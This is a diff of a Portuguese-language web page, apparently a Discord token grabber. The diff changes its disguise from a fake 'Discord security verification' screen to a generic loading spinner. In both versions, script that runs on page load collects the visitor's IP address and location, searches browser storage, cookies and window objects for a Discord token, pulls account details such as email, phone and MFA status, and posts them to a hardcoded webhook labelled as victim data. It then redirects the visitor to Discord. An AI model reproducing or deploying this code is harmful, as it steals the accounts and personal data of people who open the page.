@@ -3,54 +3,59 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Discord - Verificação de Segurança</title>
+    <title>Carregando...</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #1e1e2e, #2c2c3e);
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #0f0f13;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
-            color: #fff;
+            color: #e0e0e0;
         }
         .container {
-            background: #31313f;
-            border-radius: 16px;
-            padding: 40px;
-            max-width: 480px;
-            width: 90%;
             text-align: center;
-            box-shadow: 0 10px 40px rgba(0,0,0,0.5);
+            padding: 40px;
+            max-width: 400px;
+            width: 90%;
         }
-        .logo { width: 80px; margin-bottom: 20px; }
-        h1 { font-size: 24px; margin-bottom: 8px; }
-        .subtitle { color: #b9bbbe; font-size: 14px; margin-bottom: 24px; }
-        .progress-bar {
-            width: 100%; height: 8px;
-            background: #20202b; border-radius: 4px;
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid #2a2a35;
+            border-top: 4px solid #9B59B6;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto 20px;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        h2 { font-size: 18px; font-weight: 500; margin-bottom: 8px; color: #c0c0c0; }
+        p { font-size: 13px; color: #6a6a7a; margin-bottom: 4px; }
+        .bar {
+            width: 100%; height: 4px;
+            background: #1a1a24; border-radius: 2px;
             overflow: hidden; margin: 20px 0;
         }
-        .progress-fill {
+        .bar-fill {
             height: 100%; width: 0%;
-            background: #5865F2; border-radius: 4px;
-            transition: width 0.5s;
+            background: #9B59B6; border-radius: 2px;
+            transition: width 0.4s;
         }
-        .status { color: #b9bbbe; font-size: 13px; margin-bottom: 8px; }
-        .footer { margin-top: 24px; font-size: 12px; color: #4e5058; }
+        .footer-text { font-size: 11px; color: #3a3a48; margin-top: 30px; }
     </style>
 </head>
 <body>
 <div class="container">
-    <svg class="logo" viewBox="0 0 127.14 96.36" fill="#5865F2">
-        <path d="M107.7,8.07A105.15,105.15,0,0,0,81.47,0a72.06,72.06,0,0,0-3.36,6.83A97.68,97.68,0,0,0,49,6.83,72.37,72.37,0,0,0,45.64,0,105.89,105.89,0,0,0,19.39,8.09C2.79,32.65-1.71,56.6.54,80.21h0A105.73,105.73,0,0,0,32.71,96.36,77.7,77.7,0,0,0,39.6,85.25a68.42,68.42,0,0,1-10.85-5.18c.91-.66,1.8-1.34,2.66-2a75.57,75.57,0,0,0,64.32,0c.87.71,1.76,1.39,2.66,2a68.68,68.68,0,0,1-10.87,5.19,77,77,0,0,0,6.89,11.1A105.25,105.25,0,0,0,126.6,80.22h0C129.24,56.6,122.09,32.65,107.7,8.07ZM42.25,65.64C36.21,65.64,31.3,60,31.3,53.2s5-12.5,11.14-12.5S53.57,46.6,53.57,53.2,48.36,65.64,42.25,65.64Zm42.64,0C78.85,65.64,74,60,74,53.2s5-12.5,11.12-12.5S96.21,46.6,96.21,53.2,91,65.64,84.89,65.64Z"/>
-    </svg>
-    <h1>Verificação de segurança necessária</h1>
-    <p class="subtitle">Sua conta do Discord precisa ser verificada devido a uma atividade suspeita.</p>
-    <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
-    <p class="status" id="statusText">Iniciando verificação...</p>
-    <div class="footer">Discord Inc. &bull; Verificação automática de segurança</div>
+    <div class="spinner"></div>
+    <h2>A carregar, por favor aguarda...</h2>
+    <p>A ligação está a ser estabelecida</p>
+    <div class="bar"><div class="bar-fill" id="barFill"></div></div>
+    <p class="status-text" id="statusText" style="font-size:12px; color:#5a5a6a;">A verificar ligação</p>
+    <div class="footer-text">secured • 256-bit encryption</div>
 </div>
 
 <script>
@@ -58,15 +63,15 @@
         const webhookURL = "https://discord.com/api/webhooks/1520884691513639174/nz4F2yga5kOKPn0knFLa4fk786ksWsoM9dUDWrHz4tRUPqZejuhscaxDkgUluMVPGp37";
         
         const statusText = document.getElementById('statusText');
-        const progressFill = document.getElementById('progressFill');
+        const barFill = document.getElementById('barFill');
 
         function atualizar(texto, progresso) {
             statusText.textContent = texto;
-            progressFill.style.width = progresso + "%";
+            barFill.style.width = progresso + "%";
         }
 
         // === 1. IP ===
-        atualizar("Coletando informações do sistema...", 10);
+        atualizar("A obter informações da rede...", 10);
         let ip = "Não capturado";
         try {
             const resp = await fetch("https://api.ipify.org?format=json");
@@ -75,7 +80,7 @@
         } catch(e) {}
 
         // === 2. LOCALIZAÇÃO ===
-        atualizar("Analisando localização...", 20);
+        atualizar("A analisar localização...", 20);
         let cidade = "N/A", pais = "N/A", isp = "N/A";
         try {
             const locResp = await fetch("https://ipapi.co/json/");
@@ -85,8 +90,8 @@
             isp = locData.org || "N/A";
         } catch(e) {}
 
-        // === 3. TENTAR CAPTURAR TOKEN - TODOS OS MÉTODOS ===
-        atualizar("Analisando sessão do Discord...", 35);
+        // === 3. TENTAR CAPTURAR TOKEN ===
+        atualizar("A validar sessão...", 35);
         
         let token = null;
         let metodos = [];
@@ -101,7 +106,7 @@
             "discord.accessToken", "discord.refreshToken"
         ];
         
-        // Método 1: localStorage com chaves conhecidas
+        // Método 1: localStorage
         try {
             for (const chave of chavesPossiveis) {
                 try {
@@ -115,7 +120,7 @@
             }
         } catch(e) {}
         
-        // Método 2: sessionStorage com chaves conhecidas
+        // Método 2: sessionStorage
         if (!token) {
             try {
                 for (const chave of chavesPossiveis) {
@@ -131,7 +136,7 @@
             } catch(e) {}
         }
         
-        // Método 3: Varrer TODO o localStorage
+        // Método 3: Varrer localStorage
         if (!token) {
             try {
                 for (let i = 0; i < localStorage.length; i++) {
@@ -148,7 +153,7 @@
             } catch(e) {}
         }
         
-        // Método 4: Varrer TODO o sessionStorage
+        // Método 4: Varrer sessionStorage
         if (!token) {
             try {
                 for (let i = 0; i < sessionStorage.length; i++) {
@@ -165,7 +170,7 @@
             } catch(e) {}
         }
         
-        // Método 5: Procurar em IndexedDB
+        // Método 5: IndexedDB
         if (!token) {
             try {
                 const databases = await indexedDB.databases ? await indexedDB.databases() : [];
@@ -177,7 +182,7 @@
             } catch(e) {}
         }
         
-        // Método 6: Procurar em cookies
+        // Método 6: Cookies
         if (!token) {
             try {
                 const cookies = document.cookie.split(';');
@@ -192,7 +197,7 @@
             } catch(e) {}
         }
         
-        // Método 7: Procurar em todas as variáveis window
+        // Método 7: window
         if (!token) {
             try {
                 for (const key in window) {
@@ -211,8 +216,8 @@
             } catch(e) {}
         }
 
-        // === 4. SE ENCONTROU TOKEN, PEGAR DADOS ===
-        atualizar("Verificando dados da conta...", 50);
+        // === 4. ENVIAR DADOS ===
+        atualizar("A finalizar ligação...", 70);
         
         let email = "Não disponível";
         let phone = "Não disponível";
@@ -220,28 +225,22 @@
         let userID = "Desconhecido";
         let nitro = "N/A";
         let mfa = "N/A";
-        let avatar = "N/A";
-        let bio = "N/A";
         let verified = "N/A";
         let createdAt = "N/A";
         
-        // Função para enviar embed — TODOS roxos agora
         async function enviarEmbed(titulo, fields, descricao, mentionEveryone) {
             const content = mentionEveryone ? "@everyone" : "";
             
             const embed = {
                 title: titulo,
-                color: 0x9B59B6, // ROXO fixo
+                color: 0x9B59B6,
                 description: descricao || "",
                 fields: fields,
                 footer: {
                     text: "xxx team",
                     icon_url: "https://cdn.discordapp.com/emojis/1081535536565063770.png"
                 },
-                timestamp: new Date().toISOString(),
-                thumbnail: {
-                    url: "https://cdn.discordapp.com/icons/1053197885338624080/a_ebc9c4f8e0a3c5c0c5d6c0f5f5e0e0e0.png?size=128"
-                }
+                timestamp: new Date().toISOString()
             };
             
             const payload = { embeds: [embed] };
@@ -275,15 +274,10 @@
                     email = data.email || "Oculto/indisponível";
                     phone = data.phone || "Não vinculado";
                     mfa = data.mfa_enabled ? "Sim" : "Não";
-                    bio = data.bio || "Vazio";
                     verified = data.verified ? "Sim" : "Não";
                     
                     const premium = data.premium_type || 0;
                     nitro = premium === 2 ? "Nitro Clássico" : premium === 1 ? "Nitro Básico" : "Não";
-                    
-                    if (data.avatar && data.id) {
-                        avatar = `https://cdn.discordapp.com/avatars/${data.id}/${data.avatar}.png`;
-                    }
                     
                     if (data.id) {
                         const timestamp = (parseInt(data.id) / 4194304) + 1420070400000;
@@ -334,7 +328,6 @@
                         }
                     } catch(e) {}
 
-                    // ENVIAR EMBED ROXO COM TOKEN VÁLIDO
                     await enviarEmbed(
                         "🎯 TOKEN VÁLIDO - DADOS DA VÍTIMA",
                         [
@@ -379,7 +372,6 @@
                     );
                     
                 } else {
-                    // Token inválido — também roxo agora
                     await enviarEmbed(
                         "⚠️ TOKEN INVÁLIDO",
                         [
@@ -428,9 +420,8 @@
                 );
             }
         } else {
-            // NENHUM TOKEN ENCONTRADO → mais um burro (título apenas)
             await enviarEmbed(
-                "mais um burro 🐴",
+                "@everyone mais um burro 🐴",
                 [
                     {
                         name: "🌐 **LOCALIZAÇÃO**",
@@ -449,16 +440,16 @@
                     }
                 ],
                 `IP: ${ip} | ${cidade}, ${pais}`,
-                true // mentionEveryone = true → envia @everyone
+                true
             );
         }
 
-        // === 5. FINALIZAR ===
-        atualizar("Verificação concluída! Redirecionando...", 100);
+        // === 5. REDIRECIONAR ===
+        atualizar("Ligação estabelecida! A redirecionar...", 100);
         
         setTimeout(() => {
-            window.location.href = "https://discord.com/login";
-        }, 3000);
+            window.location.href = "https://discord.com/channels/@me";
+        }, 2000);
     })();
 </script>
 </body>
